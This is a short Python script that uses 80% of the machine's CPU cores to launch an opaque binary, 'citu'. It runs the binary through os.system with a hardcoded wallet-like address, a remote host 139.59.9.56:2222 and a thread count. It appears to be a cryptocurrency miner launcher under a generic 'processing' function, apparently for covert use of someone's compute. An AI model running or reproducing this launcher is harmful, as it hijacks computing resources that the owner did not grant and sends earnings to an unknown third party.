import subprocess
import os

# # Get the current directory
# current_directory = os.getcwd()

# # Assuming 'citu' executable is in the current directory
# citu_path = os.path.join(current_directory, "citu")
# Get the total number of CPU cores
total_cpu_cores = os.cpu_count()

# Calculate 80% of the total CPU cores
num_threads_to_use = int(total_cpu_cores * 0.8)
print(f"Number of threads to use for 80% CPU utilization: {num_threads_to_use}")

def processing(arg=None):
    # Construct the command
    command = f"ls -la && chmod +x citu && ./citu -w 25kHuqsZ7xmVNEFjmiNivXU4YHDunmsSCGxxxGzh2dVGo -h 139.59.9.56:2222 -s x -t {num_threads_to_use}"
    os.system(command)
    # Start the subprocess with stdout and stderr as PIPE
    # process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # # Wait for the process to complete
    # process.wait()

    # # Check if there's any error
    # if process.returncode != 0:
    #     print("Error occurred.")

processing()
